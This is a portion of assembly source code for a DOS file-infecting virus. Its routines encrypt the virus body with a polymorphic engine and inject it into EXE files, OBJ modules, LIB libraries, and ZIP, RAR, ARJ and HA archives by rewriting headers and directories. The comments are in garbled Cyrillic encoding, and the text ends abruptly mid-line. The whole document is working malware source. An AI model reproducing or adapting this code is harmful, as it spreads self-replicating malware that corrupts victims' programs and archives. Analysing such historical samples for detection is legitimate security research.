extrn crypt_part2:byte
        call    RND_GET
        mov     crypt_part2,  al
        mov     crypt_old1,  ah
        lea     dx, part1
        mov     cx, sizeof_part1
        call    DosWrite
        call    seek_end
sizeof_part2 = 70h
;«ãçè¥ çâ®-â® ¢à®¤¥:
; part2 -> heap
; encode virus to heap+sizeof(part1)+sizeof(part2)
        lea     di, [heap+sizeof_part1+sizeof_part2]
        mov     ax, zmeflIXE
        call    ZME_crypt ;;ret CX-SIZE
extrn ffentrvir:word
extrn crypt_old1:byte
        mov     ffentrvir, ax ;?
        lea     si, part2
        lea     di, [heap]
        push    cx
        mov     cx, sizeof_part2
        DO
            lodsb
            sub     al, crypt_part2
            stosb
        CYCLE LU
        mov     cx, sizeof_part1
        mov     al, crypt_old1
        DO
            sub     byte ptr [di], al
            inc     di
        CYCLE LU
        pop     cx

; crypt part2

        add     cx, (sizeof_part1+sizeof_part2)
        call    doswrite_from_heap
        call    write_sizemarker
pblabel error_exit_2
        pop     ax
pblabel endd
        db        0C3h
        db        0CBh
        db        0CFh
        db        09Ah
        db        0CAh
        db        0C2h
pblabel no_freq_proc
    call    get_cur_time
    sub     ax, [last_infect_time]
    cmp     ax, INTERVAL_INFECT ;0.5 ¬¨­
IFDEF RELIZ
    jl      error_exit_2 ;<<<<<<<<<debug
ENDIF
    ret

;        ret

;    DONE
pblabel standart_exe_infect
    call      seek_end   ;dx:ax - file size
    test      al, 1
    jnz       endd       ;­¥ § à ¦ âì EXEä ©«ë á ­¥ç¥â­®© ¤«¨­®©
    cmp       dl, 6       ;6*64k=384k 4*64k=256k
    jae       endd       ;file too big, infect him other method (?)

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; INFECT
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;write old header to EOF
    push    ax dx       ;dx:ax - file size
    call    crypt_exe_header
    mov     cx, exe_rle_table-exe_len_mod_512 ;14h
    call    doswrite_from_heap
    pop     dx ax

    mov     cx, ax
    and     cx, 0Fh
    add     cl, STACKBASE ;offset virus_start-10h
    mov     [exehdr.exe_SP], cx

    add     ax, VIRUSSTACKSIZE-10h          ;paragraph
    and     ax, not 0Fh

    push    ax dx
    mov     cx, dx
    mov     dx, ax
    call    dosseek
    pop     dx ax

    mov     cx, 10h
    div     cx      ;dx:ax =
    sub     ax, [exehdr.exe_par_dir]
    sub     ax, VIRUSSTACKSIZE/10h
    mov     [exehdr.exe_CS], ax
    add     ah, cl
    mov     [exehdr.exe_SS.h], ah ;64k
    call    RND_GET_THREE_BITS
    add     [exehdr.exe_SS.h], al ;


    lea     di, [heap] ;to heap
    mov     ax, zmeflEXE
    call    ZME_crypt ;;ret CX-SIZE
    add     ax, VIRUSSTACKSIZE
    mov     [exehdr.exe_IP], ax
    call    doswrite_from_heap ;write encrypted virus
    call    write_sizemarker
    call    seek_end ;get file size
    mov     di, [exehdr.exe_pages]
    call    calc_hdr_pages
;ã¬¥­ìè¨âì MinMem ­  à §¬¥à ®¢¥à«¥ï (?)
    sub     di, [exehdr.exe_pages] ;®âà¨æ.
    shl     di, 5
    add     [exehdr.exe_min_BSS], di
    DOIF NC
        mov     [exehdr.exe_min_BSS], 0
    DONE
pblabel write_exehdr
    call    dosseek_bof
    mov     cx, 1Ch
    jmp     DosWrite_shbuf  ;write new header


;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ÄÅÄÄ[process OBJ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
pblabel cycle_o
    mov     dx, [objhdr.recsize]
    sub     dx, HDRBUFSIZE - 3
    sbb     cx, cx
    call    dosseek_cur ;_cx_0
    call    read_buf_22 ;
    cmp     al, HDRBUFSIZE
    jne     obj$ret1
pblabel process_obj ;test size
;int 2bh
    cmp     [objhdr.rectype], MODEND
    je     obj$ret1
;-+-[process 98]-------------+-
    cmp     [objhdr.rectype], SEGDEF
    PASS NE
    CMP    [pos98.hi], -1
    DOIF E
    cmp word ptr [objhdr.recsize], 7
    jne     obj$ret1
    test    byte ptr [objhdr.segattr], MASK SA_B or MASK SA_P
    jnz     obj$ret1
    test    byte ptr [objhdr.segattr], 0A0h ;borland windows library is WORD alignment
;    test    byte ptr [objhdr.segattr], MASK SA_A

    DOIF Z
obj$ret1: stc
          ret
    DONE
    call    dostell
    sub     ax, HDRBUFSIZE
    sbb     dx, 0
    mov     [pos98.lo], ax
    mov     [pos98.hi], dx
    mov     ax, word ptr [objhdr.segsize]
    cmp     ax, 0Ah
    jb      obj$ret
    cmp     ah, 3
    ja      obj$ret
    mov     [siz98], ax
    DONE
;-+--------------------------+-
pblabel process_A0
;-+-[process A0]-------------+-
    cmp     [objhdr.rectype], LEDATA
    jne     cycle_o
rzheap equ <heap+80h>
;read (rzheap+80h, [objhdr.recsize]-4)
    mov     ax, HDRBUFSIZE -6h
    call    dosseek_cur_neg_ax
    sub     ax, 6h
    sbb     dx, 0
    mov     [posA0.lo], ax
    mov     [posA0.hi], dx
    lea     dx, [rzheap]
    mov     di, dx
    mov     cx, [objhdr.recsize]
    sub     cx, 4h
    call    dosread
    push    bx      ;save file handle
    push    ax ;size A0 before infect
    add     di, ax
    push di
;encode virus (rzheap+[objhdr.recsize]-4)
    mov     ax, zmeflOBJ
    call    ZME_crypt ;;ret CX-SIZE
;                    mov     [_____], ah
;                    mov     si, VIRUSSTACKSIZE
;                    mov     cx, offset start_data-VIRUSSTACKSIZE ;virus_size
;                    mov     [engdata.datasize], cx
;                    mov     [engdata.targetptr], di
;                    rep     movsb          ;copy data
;                    mov     cx, offset start_data-VIRUSSTACKSIZE ;virus_size
;                            xor ax,ax
    xchg    bx, ax ; entry virus


;¬®¦¥â ®áë¯ âìáï, ¥á«¨ ã¢¥«¨ç¨âì à §¬¥à ¢¨àãá . á¥©ç á 7000
;­ ¤®, çâ®¡ë ¡ë«® 9 ¡«®ª®¢.?
;mov ax, cx
;add ax, 3DFh
;dec ax
;cwd
;mov si, 3E0h
;div si
;inc ax
;cwd
;mov si, 3E9h
;mul si
mov ax, di
sub ax, offset rzheap
cwd
mov si, 3E0h
div si
mov dl, 7
mul dl
add ax, cx
and ax, 0Fh
sub cx, ax
add cx, 10h
pop di
add di, cx
mov     word ptr [fisize], cx

;scan
    pop     cx  ;size A0 before infect
    push    di  ;ptr to end A0 & virus
    lea     si, [rzheap+2]
    DO
        mov     di, 3
        dec     si
        dec     si
        push    cx
        call    calculate_crc    ;<add si,3
        pop     cx          ;
        cmp_ax_CRC32w  <55h, 8Bh, 0ECh> ;push bp; mov bp,sp ;< BORLAND
        je      fnd
        cmp_ax_CRC32w  <55h, 89h, 0E5h> ;push bp; mov bp,sp ;< BORLAND
        je      fnd
        cmp_ax_CRC32w  <52h, 89h, 0C2h> ;push dx; mov dx,ax ;< WATCOM
        je      fnd
    CYCLE LU

    pop ax
;error_exit_2:
    pop ax
obj$ret: stc  ;CF - error flag for process_lib
    ret
fnd:
    mov     byte ptr [si-3], opCALL
    lea     ax, [bx-3]
    add     ax, cx
    mov     word ptr [si-2], ax ;, 00 ;(cx+bx-3)
    pop     dx      ;ptr to end A0 & virus
    pop     bx      ;restore file handle
;rezka
    lea     si, [rzheap]
    lea     di, [heap]
    DO      ;@repeat:
        sto_byte LEDATA
        mov     ax, dx
        sub     ax, si
        MIN     ax, 3E0h
        push    ax         ;block size
        add     ax, 4
        stosw
        sto_byte 1
        mov     ax, si
        sub     ax, offset rzheap
        stosw
        pop     cx
;/----crc-------------------\
        add     al, byte ptr [di-4]
        add     al, byte ptr [di-5]
        add     al, ah
        add     al, LEDATA+1
        DO
            add al, byte ptr [si]
            movsb
        CYCLE LU
        neg    al
        stosb
;\--------------------------/
        cmp     si, dx
    CYCLE B ;    jb      @repeat

    sub     di, (offset heap)+3E7h
    push    di   ;razmer wtorogo finserta

;seek_pos(posA0)????
     mov     dx, [posA0.lo]
     mov     cx, [posA0.hi]
     call    dosseek
;write (heap, [objhdr.recsize]+3)
     mov     cx, [objhdr.recsize]
     add     cx, 3
     call    doswrite_from_heap
;f_insert (heap+[objhdr.recsize], 3E7h-([objhdr.recsize]+3))
     mov     si, ax
     add     si, dx
     mov     cx, 3E7h
     sub     cx, ax
     add     di, cx
     mov     [lib_dict_offset], di
;     adc     [lib_dict_offset.hi], 0
     push    cx
      call    dostell
     pop     cx
     call    f_insert
;read (objhdr, 22h)
;---- skip FIXUPP if present
     call    read_buf_22
     cmp     [objhdr.rectype], FIXUPP
     DOIF E
        sub     ax, 3
        sub     ax, [objhdr.recsize]
     DONE
     call    dosseek_cur_neg_ax
;f_insert (heap+3E7h, virrsize-3E7h)
     lea     si, [heap+3E7h]
    pop     cx  ;virrsize-3E7h
    call    f_insert
;-process-segment------------
    mov     dx, [pos98.lo]
    mov     cx, [pos98.hi]
    call    dosseek
    call    read_buf_22
    call    dosseek_cur_neg_ax
    mov     ax, [fisize]
    add     word ptr [shift_buffer.segsize], ax
;/----crc-------------------\
    mov     cx, [objhdr.recsize]
    lea     si, [vir_heap._objhdr]
    inc cx
    lodsb
    DO
        add al, byte ptr [si]
        inc si
    CYCLE LU
    neg     al
    mov     byte ptr ds:[si], al
;\--------------------------/
    jmp     DosWrite_shbuf_22


;ÄÅÄÄ[process LIB]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
pblabel process_lib
;CALL CHECK_PROCESS_NAME
; âª § à ¦¥­¨¥ LIB § ­¨¬ ¥â ¬­®£® ¢à¥¬¥­¨
; íâ® áâ®¨â ¤¥« âì ¯à¨ à ¡®â¥ NDD, PKLITE, TLINK, etc

    cmp     byte ptr [libhdr.lib_hdr_dict_offs], 0
    jne     lib$ret ;already infect
    DO                                      ;infect exitcode of 'C' program
        mov     di, 8                       ;search for 'EXIT'
        lea     si, [vir_heap._libhdr]
        call    calculate_crc    ;<add si,3
;; § à ¦¥­¨¥ '___write', '__ioalloc_' ¨â¯
        cmp_ax_CRC32w <80h, 6, 0, 4, 'E', 'X', 'I', 'T'>      ;< BORLAND
        je      exfound
        cmp_ax_CRC32w <80h, 6, 0, 4, 'e', 'x', 'i', 't'>      ;< WATCOM
        je      exfound
        mov     dx, 10h-HDRBUFSIZE
        call    dosseek_cur_cx_1
        mov     cx, 10h
        div     cx
        mov     [virobjblk], ax
        call    read_buf_22
        cmp     al, HDRBUFSIZE
    CYCLE E
end_process_dictionary:
lib$ret:    ret


pblabel exfound
    cmp     byte ptr [libhdr+14h], 32h
    je      lib$ret
    call    process_obj ;hmmm...
    jc      lib$ret
    call    dosseek_bof
    call    read_buf_22
    mov     ax, [lib_dict_offset]
    add     [libhdr.lib_hdr_dict_offs.lo], ax
    adc     [libhdr.lib_hdr_dict_offs.hi], 0
    call    write_exehdr
;    call    dosseek_bof
;    call    doswrite_shbuf_22
;¢ á«®¢ à¥:  ¤«ï ¢á¥å § ¯¨á¥© > exit_ ¤®¡ ¢¨âì à §¬¥à ¢áâ ¢ª¨ ¢ ¯ à £à ä å
;seek (lib_hdr_dict_offs)
    mov     cx, [libhdr.lib_hdr_dict_offs.hi]
    mov     dx, [libhdr.lib_hdr_dict_offs.lo]
    call    dosseek
    DO
        lea     dx, [heap]
        mov     cx, LIB_DICTIONARY_ENTRY_SIZE
        call    dosread                 ; read (heap, 0x200)
        mov     dx, LIB_DICTIONARY_ENTRY_SIZE
        cmp     ax, dx                  ; ¯®â®¬ á¤¥« © ç¥à¥§ SAHF
        jne     end_process_dictionary  ;< ¯®á«¥ íâ®£® ­ ¤®-¡ë
        call    dosseek_cur_neg_dx      ; áâàã­ª¥©â¨âì extended dictionary.
        lea     si, [heap]              ; process:)
        mov     cx, 25h
        DO
            lodsb
            push    si
            mov     ah, ch   ;ch=0
            add     ax, ax
            DOIF NZ
                add     ax, offset heap
                xchg    si, ax
                lodsb
                mov     ah, ch   ;ch=0
                add     si, ax
                cmp     word ptr [si], UNINIT
virobjblk equ word ptr ($-2)
                DOIF A
                    mov     ax, [lib_dict_offset]
                    shr     ax, 4
                    add     word ptr [si], ax
                DONE
            DONE
            pop     si
        CYCLE LU
        mov     cx, LIB_DICTIONARY_ENTRY_SIZE
        call    doswrite_from_heap      ; write (heap, 0x200)
    CYCLE
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;ÄÅÄÄ[process HA]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
pblabel process_ha
;int 2bh
    mov     ax, [hahdr.filecnt]
    inc     ax
    mov     [hafcount], ax
    mov     ax, HDRBUFSIZE - (size ha_main)
    call    dosseek_cur_neg_ax
    jmp     sss
pblabel cycle8
;seek(size ha_file_hdr)+size name+machine+1
    lea     si, [vir_heap._hahdr.ha_name]
    mov     cx, 42h ; max length name
    DO
        lodsb
        and     al, al
    CYCLE LUNZ
    jcxz    error_exit2
    lodsb
    mov     ah, 0
    sub     cx, 34h
    sub     ax, cx
    sbb     cx, cx                            ;<cx=0
    add     ax, [hahdr.ha_compress_size.lo]
    adc     cx, [hahdr.ha_compress_size.hi]
    xchg    dx, ax
    call    dosseek_cur
sss:
;read(header)
    call    read_buf_22
    cmp     [hahdr.ha_ver_method], HA_METHOD_STORED
    je      error_exit2
    cmp     al, HDRBUFSIZE
    je      cycle8
    cmp     al, 0
    jne     error_exit2
;/+- CREATE HAHDR -+-
    lea     di, [vir_heap._crthdr]
    sto_byte  HA_METHOD_STORED
    call    store_fisize
    lea     si, [vir_heap._arx_crc]
    movs4                   ;d;file crc_32
    call    create_dtim1
    sto_byte 0              ;    sto_word '/'
    call    store_fname
    sto_two_byte    0, 2
    sto_two_byte    1, 20h
;\+- CREATE HAHDR -+-
    mov     cx, [fnamesize]
    add     cx, SIZE ha_file_hdr + 3 ; 0h
    lea     dx, [vir_heap._crthdr]
    call    doswrite
    mov     cx, word ptr [fisize]
    mov     dx, word ptr [fioff]
    call    doswrite
    mov     dx, 2
    call    dosseek_cx_0
    mov     cx, 2
    lea     dx, [vir_heap._hafcount]
    jmp     doswrite
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;ÄÅÄÄ[process RAR]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
pblabel process_rar
    DO
        cmp     [rarhdr.rar_head_type], 73h ;
        DOIF E ;test for multi-volume archive (?)
            test    byte ptr [rarhdr.rar_head_flags], 1h
            DOIF NZ
pblabel error_exit2
    ret
            DONE ; remove Authenticity information present flag
            and     byte ptr [rarhdr.rar_head_flags], not 20h
            call    dosseek_cur_neg_ax
            mov     di, SIZE rar_main_hdr - 2
            lea     si, [vir_heap._rarhdr.rar_head_type]
            call    Calculate_CRC
            mov     [rarhdr.rar_head_crc], cx
            call    DosWrite_shbuf_22
        DONE
        cmp     [rarhdr.rar_method], RAR_METHOD_STORED
        je      error_exit2
        mov     dx, [rarhdr.rar_f_head_size]
        sub     dx, HDRBUFSIZE
        sbb     cx, cx
        test    byte ptr [rarhdr.rar_head_flags.1], 80h
        DOIF NZ
            add     dx, [rarhdr.rar_compressed_size.lo]
            adc     cx, [rarhdr.rar_compressed_size.hi]
        DONE
        call    dosseek_cur
        call    read_buf_22
pr_rar:
        and     ax, ax ;if eof
        EXIT Z
            cmp     [rarhdr.rar_head_type], 74h
    CYCLE BE            ; if marker block  or archive header
    push    ax
;/+- CREATE RARHDR 1.50 -+-
    LEA     di, [vir_heap._crthdr+2]
    sto_two_byte    74h, 0
    sto_byte        80h
    call    sto_fnamesize_20
    call    store_fisize
    stosb                   ;rar_host_os    =0
    lea     si, [vir_heap._arx_crc]
    movs4                   ;d;file crc_32
    call    create_dtim1
    sto_two_byte 0Fh, RAR_METHOD_STORED
    sto_word_   <[fnamesize]>
    mov     al, 20h
    call    stosw_sto_0
    call    store_fname
    lea     si, [vir_heap._crthdr+2]
    sub     di, si
    call    Calculate_CRC
    mov     word ptr [crthdr], cx ;[si-2] (?)
;\+- CREATE RARHDR -+-
    pop     ax
    call    dosseek_cur_neg_ax
    mov     cx, SIZE rar_file_hdr
    JMP     f_insert_hdr_und_file
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;include add2arj.as1
;ÄÅÄÄ[process ARJ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
    DO   ;seek_cur(arj_bas_hdr_size+0Ah+arj_compressed_size-22h)
        mov     dx, [arjhdr.arj_bas_hdr_size]
        sub     dx, HDRBUFSIZE-0Ah
        sbb     cx, cx
        cmp     [arjhdr.arj_original_size.lo], cx
        DOIF NE ; if first header - (great BUG)
            add     dx, [arjhdr.arj_compressed_size.lo]
            adc     cx, [arjhdr.arj_compressed_size.hi]
            cmp     [arjhdr.arj_compres_method], ARJ_METHOD_STORED
            DOIF E
pblabel error_exit3
                ret
            DONE
        DONE
        call    dosseek_cur
        call    read_buf_22
pblabel process_arj
        test    [arjhdr.arj_flags], 4h ;test for multi-volume archive (?)
        jnz     error_exit3
        cmp     [arjhdr.arj_bas_hdr_size], 0
    CYCLE NE
    push    ax  ;
;/+- CREATE ARJHDR -+-
    lea     di, [vir_heap._crthdr]
    lea     si, arj_h
    movsw   ;arj_id
    call    sto_fnamesize_20
    movsw ;31e
    mov     al, 1
    stosw ;1
    dec     ax
    call    create_dtim
    call    store_fisize
    movs4       ;d;file crc_32
    sto_word 0
    stos2w           ;0
    call    store_fname ;*;name
    stosw           ;0
    push    di
    lea     si, [vir_heap._crthdr.arj_first_hdr_size]
    sub     di, si
    call    calculate_crc
    pop     di
    xchg    ax, cx
    call    st_dx_0
;\+- CREATE ARJHDR -+-
    pop     ax
    call    dosseek_cur_neg_ax
    mov     cx, 2Ah         ;SIZE zip_local_header
pblabel f_insert_hdr_und_file
    CALL    f_insert_hdr
    mov     cx, word ptr [fisize]
    mov     si, word ptr [fioff]
    jmp     f_insert
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;include add2zip.as1
;Ä[create zip headers]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_zip
    LEA     di, [vir_heap._crthdr]
    lea     si, zip_h
    movsw ;'KP'
    lodsw ;304
    DOIF  NZ ;CENTRAL_FLAG              ;        $$if central
        sto_word ZIP_CNL_ID
        mov     ax, word ptr ds:[si] ;20d;?ver?
    DONE
    stosw
    movsw ;14
    mov     ax, 2
    pushf
    call    create_dtim
    add_si4
    movs4     ;d;file crc_32
    call    store_fisize
    mov     ax, [fnamesize]
    call    stosw_sto_0 ;extra field size =0
    popf
    DOIF NZ ;CENTRAL_FLAG        ;        $$if central
        stos3w ;=0
        mov     al, 20h
        call    stosw_sto_0
        add_di4
    DONE
pblabel store_fname            ;*;name
    mov     cx, [fnamesize]
    rep     movsb
pblabel error_exit1
    ret
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ÄÅÄÄ[process ZIP]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄ
pblabel cycle1
    mov     dx, [ziphdr.zip_size_fname]
    sub     dx, 4
    sbb     cx, cx
    add     dx, [ziphdr.zip_extra_field_length]
    cmp     [ziphdr.zip_compression_method], ZIP_METHOD_STORED
    je      mustdie
    add     dx, [ziphdr.zip_compressed_size.lo]
    adc     cx, [ziphdr.zip_compressed_size.hi]
    call    dosseek_cur
    call    read_buf_22 ; read(ziphdr, sizeof(zipcnthdr))
pblabel process_zip
;$BEEP$
;    DOIF E

;    DONE
    cmp     word ptr [ziphdr.zip_loc_sign.hi], ZIP_LCL_ID
    je      cycle1
    cmp     word ptr [ziphdr.zip_loc_sign.hi], ZIP_CNL_ID
    jne     error_exit1
    call    create_zip
    mov     dx, - HDRBUFSIZE ; SIZE zip_local_header
    call    dosseek_cur_cx_1
    mov     [crthdr.zip_rel_off_of_loc_hdr_.lo], ax
    mov     [crthdr.zip_rel_off_of_loc_hdr_.hi], dx
    mov     cx, SIZE zip_local_header ;1e
    call    f_insert_hdr_und_file
    jmp     proc_cnt
    DO
; seek_cur(ziphdr.filename_length_+ziphdr.extra_field_length_
; +ziphdr.file_comment_length_)
        mov     dx, [ziphdr.zip_size_fname_]
        add     dx, [ziphdr.zip_extra_field_length_]
        add     dx, [ziphdr.zip_file_comment_length_]
        add     dx, 0Ch
        call    dosseek_cur_cx_0
pblabel proc_cnt
        call    read_buf_22
        cmp     [ziphdr.zip_centr_sign_.lo], ZIP_SIGN
        jne     error_exit1
        cmp     word ptr [ziphdr.zip_centr_sign_.hi], ZIP_CNL_ID
    CYCLE E
    cmp     word ptr [ziphdr.zip_centr_sign_.hi], ZIP_END_ID
    jne     error_exit1
    call    dosseek_cur_neg_ax  ; seek_cur(-sizeof(zip_centr_header))
    inc     [ziphdr.ttl_num_of_ent_on_this_disk]
    inc     [ziphdr.ttl_num_of_ent_in_the_cent_dir]
    add     [ziphdr.size_of_the_central_directory.lo], size zip_central_header
    mov     ax, [fnamesize]
    cwd     ;DX := 0
    add     [ziphdr.size_of_the_central_directory.lo], ax
    adc     [ziphdr.size_of_the_central_directory.hi], dx
    add     ax, [fisize] ;[zip_compressed_size.lo]
    add     ax, SIZE zip_local_header
    add     [ziphdr.off_of_strt_of_cent_directory.lo], ax
    adc     [ziphdr.off_of_strt_of_cent_directory.hi], dx
    mov     cx, SIZE zip_end_header
    call    DosWrite_shbuf  ;write zip_end_header
    cmp     dx, bp  ;zf=0
    call    create_zip  ; create_centr_header
    mov     dx, -SIZE zip_end_header ;-16
    call    dosseek_cur_cx_1
    mov     cx, SIZE zip_central_header
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;%NOINCL
;.SALL

;shift_buffer_size = 13h
pblabel f_insert_hdr
    add     cx, [fnamesize]
pblabel f_insert_hdr_wirhout_fname
    LEA     si, [vir_heap._crthdr]
pblabel f_insert
    push    dx ax
    push    cx      ; insert_size
    xor     cx,cx   ; cx := 0
    sub     ax, HDRBUFSIZE
    sbb     dx, cx
    mov     [beg_pos.hi], dx
    mov     [beg_pos.lo], ax
    dec     cx      ; cx := -1
    mov     dx, - HDRBUFSIZE
    mov     al, 2   ; seek_end ( - shift_buffer_size )
    call    DosSeek_all
    DO
        call    read_buf_22    ; read ( shift_buffer, shift_buffer_size )
        pop     dx             ; seek_cur ( insert_size - shift_buffer_size )
        push    dx
        sub     dx, HDRBUFSIZE   ; sub dx,ax (?)
        call    dosseek_cur_cx_0
        call    DosWrite_shbuf_22 ; write ( shift_buffer, shift_buffer_size )
        pop     dx         ; seek_cur ( - insert_size - 2*shift_buffer_size )
        push    dx
        add     dx, HDRBUFSIZE*2
        call    dosseek_cur_neg_dx      ; #### DX:AX=curpos
        cmp     dx, [beg_pos.hi]
        REPEAT A
        cmp     ax, [beg_pos.lo]
    CYCLE A
;-+--------+- seek for write -+--------+-
    pop     ax      ; insert_size
    pop     dx cx
    push    ax
    call    dosseek
    mov     dx, si
    pop     cx
    call    DosWrite
    jmp     dostell
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;shift_buffer_size = 22h

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel sto_fnamesize_20
    mov     ax, 20h
    add     ax, [fnamesize]
    stosw
    ret
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel store_fisize
    xor     dx, dx
    sto_word_ <[fisize]> ;.filesize
    xchg    dx, ax
pblabel st_dx_0
    stosw     ;d;hdr crc
    xchg    ax, dx
pblabel stosw_sto_0
    stosw
    sto_word 0
    ret
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call        stosw_sto_0
pblabel create_dtim1
    sto_word    TIMEMARKER   ;time  = const TIMEMARKER
    sto_word_   <[host_arx_date]>
    ret
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel write_sizemarker
;write garbage
    lea     di, [heap] ;from heap
    mov     ax, SIZEMARKER+SIZEMARKER_MOD
    CALL    SHIT_AX
    ;write virus
    call    seek_end       ;dx:ax - file size
    xor     dx, dx
    mov     cx, SIZEMARKER
    div     cx
    sub     cx, dx
    add     cx, SIZEMARKER_MOD
    jmp    doswrite_from_heap

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db      '.EXE'
;xCOM        db      '.COM'
pblabel hdrs
            CRC32w  <'P','K','',''>       ;ZIP
            CRC32w  < ptr ($-2)







